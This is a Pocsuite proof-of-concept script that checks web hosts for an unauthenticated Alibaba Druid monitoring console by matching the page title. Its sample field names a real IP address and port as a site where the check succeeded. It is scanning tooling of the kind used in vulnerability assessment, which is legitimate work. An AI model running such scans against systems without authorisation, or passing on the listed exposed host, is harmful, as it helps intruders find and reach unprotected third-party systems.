#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class DruidPOC(POCBase):
    vulID = '8'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-03-22' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-03-22'# 编写 PoC 的日期
    updateDate = '2017-03-22'# PoC 更新的时间,默认和编写时间一样
    references = ''# 漏洞地址来源,0day不用写
    name = 'Druid Unauthorized access'# PoC 名称
    appPowerLink = 'https://github.com/alibaba/druid/'# 漏洞厂商主页地址
    appName = 'Druid'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Druid 未授权漏洞
    ''' # 漏洞简要描述
    samples = ['http://197.155.234.62:8081/']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 8-druid-access.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        import urlparse, re
        host = urlparse.urlparse(self.url).scheme + "://" + urlparse.urlparse(self.url).netloc
        vul_url = str( host )
        #print vul_url
        r = req.get(url=vul_url,allow_redirects=False, timeout=3) #禁止重定向
        title =re.findall(r"<title>(.*)</title>",r.content)[0]
        # print title
        """
        临时判断 , 有正确和误报时,对比提取特征解决误报
        """
        #print r,type(r)
        if  "Druid Console" in title :
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Payload'] = vul_url
        else:
            pass
        print '[+]8 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(DruidPOC)

